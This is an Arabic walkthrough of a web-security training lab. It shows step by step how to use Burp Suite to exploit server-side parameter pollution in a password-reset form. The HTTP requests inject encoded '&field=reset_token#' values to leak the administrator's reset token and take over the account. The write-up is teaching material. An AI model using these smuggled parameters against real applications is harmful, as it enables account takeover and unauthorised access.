
---

# حل لاب Burp Suite - إعادة تعيين كلمة المرور

## المقدمة
الهدف من اللاب ده هو استغلال ثغرة في خاصية إعادة تعيين كلمة المرور الخاصة بمستخدم المسؤول في التطبيق باستخدام Burp Suite. هنشوف إزاي ممكن نتعامل مع الطلبات ونتلاعب فيها لتجاوز عملية التحقق والوصول إلى إعادة تعيين كلمة المرور.

## الخطوات

### 1. **تفعيل خاصية إعادة تعيين كلمة المرور للمسؤول**
- افتح **Burp Suite** واستخدم المتصفح المدمج في Burp.
- قم بتفعيل عملية **إعادة تعيين كلمة المرور** لحساب المسؤول.

### 2. **استعراض الطلبات في HTTP History**
- اذهب إلى **Proxy > HTTP History** ولاحظ وجود طلب `POST /forgot-password` والملف JavaScript `/static/js/forgotPassword.js`.

### 3. **إرسال الطلب إلى Repeater**
- اضغط بالزر الأيمن على طلب `POST /forgot-password` واختر **Send to Repeater**.

### 4. **إرسال الطلب للتحقق من الاستجابة**
- في تبويب **Repeater**، أعد إرسال الطلب للتحقق من أن الاستجابة ثابتة.
```http
POST /forgot-password HTTP/2
Host: 0a5000c50469d0a78111a26700d200ba.web-security-academy.net

csrf=DtiMbvYfTJRsUzI7FNdbXalncO9Nw3Qg&username=administrator
```
### 5. **تغيير قيمة المعامل username**
- غير قيمة المعامل `username` من `administrator` إلى اسم مستخدم غير صالح مثل `administratorx` ثم أرسل الطلب.
- ستلاحظ رسالة خطأ تقول "Invalid username".
```http
POST /forgot-password HTTP/2
Host: 0a5000c50469d0a78111a26700d200ba.web-security-academy.net

csrf=DtiMbvYfTJRsUzI7FNdbXalncO9Nw3Qg&username=administratorx
```
### 6. **محاولة إضافة معامل جديد في الطلب**
- حاول إضافة زوج آخر من المعاملات باستخدام علامة `&` URL-encoded مثل:
```http
POST /forgot-password HTTP/2
Host: 0a5000c50469d0a78111a26700d200ba.web-security-academy.net

csrf=DtiMbvYfTJRsUzI7FNdbXalncO9Nw3Qg&username=administrator%26x=y
```

- لاحظ أن الخادم يرسل رسالة "Parameter is not supported".

### 7. **تقليص سلسلة الاستعلام باستخدام #**
- حاول تقليص الاستعلام باستخدام الرمز `#` URL-encoded:
```http
POST /forgot-password HTTP/2
Host: 0a5000c50469d0a78111a26700d200ba.web-security-academy.net

csrf=DtiMbvYfTJRsUzI7FNdbXalncO9Nw3Qg&username=administrator%23
```

- ستلاحظ أن الخادم يرسل رسالة "Field not specified".

### 8. **إضافة معمل `field` غير صالح**
- أضف معامل `field` بقيمة غير صالحة ثم قم بتقليص سلسلة الاستعلام بعده مثل:
```http
POST /forgot-password HTTP/2
Host: 0a5000c50469d0a78111a26700d200ba.web-security-academy.net

csrf=DtiMbvYfTJRsUzI7FNdbXalncO9Nw3Qg&username=administrator%26field=x%23
```

- ستلاحظ أن الخادم يرسل رسالة "Invalid field".

### 9. **محاولة التلاعب مع المعامل field باستخدام Intruder**
- اضغط بالزر الأيمن على طلب `POST /forgot-password` واختر **Send to Intruder**.
- في تبويب **Intruder**، قم بتحديد موضع الحمولة (payload) على قيمة المعامل `field`.
  - مثال على الحمولة:
  ```
  username=administrator%26field=§x§%23
  ```
- اختر **Add from list** تحت **Payload configuration** واختر قائمة **Server-side variable names** ثم ابدأ الهجوم.

### 10. **مراجعة النتائج**
- بعد إرسال الهجوم، ستلاحظ أن الطلبات التي تحتوي على الحمولة الخاصة بـ `username` و `email` ترجع استجابة **200**.

### 11. **تغيير قيمة المعامل field إلى email**
- غير قيمة `field` من `x#` إلى `email`:
  ```
  username=administrator%26field=email%23
  ```
- أرسل الطلب ولاحظ أن الاستجابة تعود كما كانت في البداية، مما يشير إلى أن `email` هو نوع حقل صالح.

### 12. **مراجعة ملف JavaScript `forgotPassword.js`**
- اذهب إلى **Proxy > HTTP History** وابحث عن ملف `forgotPassword.js`.
- ستلاحظ أن ملف JavaScript يحتوي على الرابط الخاص بمعامل **reset_token**.

```javascript
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const resetToken = urlParams.get('reset-token');
if (resetToken)
{
    window.location.href = `/forgot-password?reset_token=${resetToken}`;
}

```
### 13. **استخدام المعامل reset_token**
- في تبويب **Repeater**، غير قيمة المعامل `field` إلى `reset_token`:
```http
POST /forgot-password HTTP/2
Host: 0a5000c50469d0a78111a26700d200ba.web-security-academy.net

csrf=DtiMbvYfTJRsUzI7FNdbXalncO9Nw3Qg&username=administrator%26field=reset_token%23

```

- أرسل الطلب ولاحظ أن هذا يعطيك **reset_token**.

### 14. **إعادة تعيين كلمة المرور**
- في المتصفح المدمج بـ Burp، اذهب إلى الرابط الخاص بإعادة تعيين كلمة المرور:
  ```
  /forgot-password?reset_token=ry3d1ut95q0u92wkk4igj02dz7g98qfq
  ```
- ضع الـ **reset_token** في الرابط وقم بتعيين كلمة مرور جديدة.

### 15. **تسجيل الدخول وحل اللاب**
- بعد تعيين كلمة المرور الجديدة، قم بتسجيل الدخول كمستخدم **المسؤول**.
- اذهب إلى لوحة التحكم **Admin panel** وقم بحذف المستخدم **carlos** لحل اللاب.

---

## الخاتمة
اللاب ده بيعلمنا إزاي نقدر نستخدم Burp Suite لاستغلال ثغرات في خاصية إعادة تعيين كلمة المرور للمستخدمين في تطبيقات الويب. من خلال فهم كيفية التلاعب بالطلبات، نقدر نكتشف ثغرات ونستغلها عشان نتجاوز عملية الأمان.

---
